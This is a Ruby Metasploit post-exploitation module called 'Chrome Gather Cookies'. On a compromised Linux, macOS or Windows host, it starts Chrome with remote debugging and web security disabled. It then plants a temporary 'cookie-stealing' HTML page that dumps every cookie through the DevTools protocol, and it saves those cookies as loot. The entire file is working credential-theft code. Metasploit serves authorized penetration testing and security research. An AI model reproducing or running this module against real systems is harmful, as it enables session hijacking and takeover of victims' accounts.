##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post
  include Msf::Post::File

  GET_ALL_COOKIES_REQUEST = '{"id": 1, "method": "Network.getAllCookies"}'.freeze

  def initialize(info = {})
    super(update_info(info,
      'Name' => 'Chrome Gather Cookies',
      'Description' => "
      Read all cookies from the Default Chrome profile of the target user.
      ",
      'License' => MSF_LICENSE,
      'Author' => ['mangopdf <mangodotpdf[at]gmail.com>'],
      'Platform' => %w[linux unix bsd osx],
      'SessionTypes' => %w[meterpreter shell]))

    register_options(
      [
        OptString.new('CHROME_BINARY_PATH', [false, "The path to the user's Chrome binary (leave blank to use the default for the OS)", '']),
        OptString.new('WRITEABLE_DIR', [false, 'Where to write the html used to steal cookies temporarily, and the cookies. Leave blank to use the default for the OS (/tmp or AppData\\Local\\Temp)', ""]),
        OptInt.new('REMOTE_DEBUGGING_PORT', [false, 'Port on target machine to use for remote debugging protocol', 9222])
      ]
    )
  end

  def configure_for_platform
    vprint_status('Determining session platform')
    vprint_status("Platform: #{session.platform}")
    vprint_status("Type: #{session.type}")

    case session.platform
    when 'unix', 'linux', 'bsd', 'python'
      @platform = :unix
      @chrome = 'google-chrome'
      @user_data_dir = "/home/#{session.username}/.config/google-chrome"
      @temp_storage_dir = datastore['WRITABLE_DIR']
      @temp_storage_dir = @temp_storage_dir.nil? ? "/tmp" : @temp_storage_dir
    when 'osx'
      @platform = :osx
      @chrome = '/Applications/Google Chrome.app/Contents/MacOS/Google Chrome'
      @user_data_dir = expand_path "/Users/#{session.username}/Library/Application Support/Google/Chrome"
      @temp_storage_dir = datastore['WRITABLE_DIR']
      @temp_storage_dir = @temp_storage_dir.nil? ? "/tmp" : @temp_storage_dir
    when 'windows'
      @platform = :windows
      @chrome = '"\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exe"'
      @user_data_dir = "\\Users\\#{session.username}\\AppData\\Local\\Google\\Chrome\\User Data"
      @temp_storage_dir = datastore['WRITABLE_DIR']
      @temp_storage_dir = @temp_storage_dir.nil? ? "\\Users\\#{session.username}\\AppData\\Local\\Temp" : @temp_storage_dir
    else
      fail_with Failure::NoTarget, "Unsupported platform: #{session.platform}"
    end

    unless datastore['CHROME_BINARY_PATH'].empty?
      @chrome = datastore['CHROME_BINARY_PATH']
    end

    # Warn user that we are leaving a running process behind.
    if session.type != "meterpreter"
      print_warning "Non-meterpreter session used - This module will leave a headless Chrome process running on the target machine."
    end

    unless writable? @temp_storage_dir
      fail_with Failure::BadConfig, "#{@temp_storage_dir} is not writable"
    end

    @html_storage_path = create_cookie_stealing_html

    @chrome_debugging_cmd = @chrome.to_s
    @chrome_debugging_args = []

    if @platform == :windows
      # `--headless` doesn't work on Windows, so use an offscreen window instead.
      @chrome_debugging_args << '--window-position=0,0'
      @chrome_debugging_args << '--enable-logging --v=1'
    else
      @chrome_debugging_args << '--headless'
    end

    chrome_debugging_args_all_platforms = [
      '--disable-translate',
      '--disable-extensions',
      '--disable-background-networking',
      '--safebrowsing-disable-auto-update',
      '--disable-sync',
      '--metrics-recording-only',
      '--disable-default-apps',
      '--mute-audio',
      '--no-first-run',
      '--disable-web-security',
      '--disable-plugins',
      '--disable-gpu'
    ]

    @chrome_debugging_args += chrome_debugging_args_all_platforms

    @chrome_debugging_args << " --user-data-dir=\"#{@user_data_dir}\""
    @chrome_debugging_args << " --remote-debugging-port=#{datastore['REMOTE_DEBUGGING_PORT']}"
    @chrome_debugging_args << " #{@html_storage_path}"

    @chrome_debugging_args = @chrome_debugging_args.join(" ")
  end

  def create_cookie_stealing_html
    cookie_stealing_html = %(
      <!DOCTYPE html>
      <html lang="en">
      <head>
        <meta charset="utf-8">
        <title>index.html</title>
      </head>
      <body>
          <script>

              var remoteDebuggingPort = #{datastore['REMOTE_DEBUGGING_PORT']};
              var request = new XMLHttpRequest();
              request.open("GET", "http://localhost:" + remoteDebuggingPort + "/json");
              request.responseType = 'json';
              request.send();

              request.onload = function() {
                var webSocketDebuggerUrl = request.response[0].webSocketDebuggerUrl;
                console.log(webSocketDebuggerUrl);
                var connection = new WebSocket(webSocketDebuggerUrl);

                connection.onopen = function () {
                  connection.send('{"id": 1, "method": "Network.getAllCookies"}');
                };

                connection.onmessage = function (e) {
                  var cookies_blob = JSON.stringify(JSON.parse(e.data).result.cookies);
                  console.log('REMOTE_DEBUGGING|' + cookies_blob);
                };
              }
          </script>
      </body>
      </html>
    )

    # Where to temporarily store the cookie-stealing html
    if @platform == :windows
      html_storage_path = "#{@temp_storage_dir}\\#{Rex::Text.rand_text_alphanumeric(10..15)}.html"
    else
      html_storage_path = "#{@temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}.html"
    end

    write_file html_storage_path, cookie_stealing_html

    html_storage_path
  end

  def cleanup
    rm_f @html_storage_path
    rm_f @chrome_debug_log
  end

  def get_cookies
    if @platform == :windows
      # Write to the chrome debug log, since `--enable-logging` is incompatible with `--headless`.
      chrome_cmd = "#{@chrome_debugging_cmd} #{@chrome_debugging_args}"
      @chrome_debug_log = "#{@user_data_dir}\\chrome_debug.log"
      kill_cmd = "taskkill /f /pid"
      @cookie_storage_path = @chrome_debug_log

    else
      @cookie_storage_path = "#{@temp_storage_dir}/#{Rex::Text.rand_text_alphanumeric(10..15)}"
      chrome_cmd = "#{@chrome_debugging_cmd} #{@chrome_debugging_args} > #{@cookie_storage_path} 2>&1"
      kill_cmd = "kill -9"
    end

    if session.type == "meterpreter"
      chrome_pid = cmd_exec_get_pid chrome_cmd
      print_status "Activated Chrome's Remote Debugging (pid: #{chrome_pid}) via #{chrome_cmd}"
      Rex.sleep(5)

      chrome_output = read_file @cookie_storage_path
      kill_output = cmd_exec "#{kill_cmd} #{chrome_pid}"
      print_status "Running #{kill_cmd}\
      #{kill_output}"
    else
      chrome_output = cmd_exec chrome_cmd
      print_status "Activated Chrome's Remote Debugging via #{chrome_cmd}"
      print_warning "Leaving headless Chrome process running...."
    end

    # Parse out the cookies from Chrome's output
    cookies_pattern = /REMOTE_DEBUGGING|\[.*\]/m
    cookies_msg = cookies_pattern.match(chrome_output).to_s

    # Slice off the "REMOTE_DEBUGGING|" delimiter, and join the cookies back together (cookies may contain "|").
    cookies_json = cookies_msg.split("|")[1..-1].join("|")

    cookies_json
  end

  def save(msg, data, ctype = 'text/json')
    ltype = 'chrome.gather.cookies'
    loot = store_loot ltype, ctype, session, data, nil, msg
    print_good "#{msg} stored in #{loot}"
  end

  def run
    fail_with Failure::BadConfig, 'No session found, giving up' if session.nil?

    configure_for_platform
    cookies = get_cookies
    cookies_parsed = JSON.parse cookies
    save "#{cookies_parsed.length} Chrome Cookies", cookies
    cleanup
  end
end
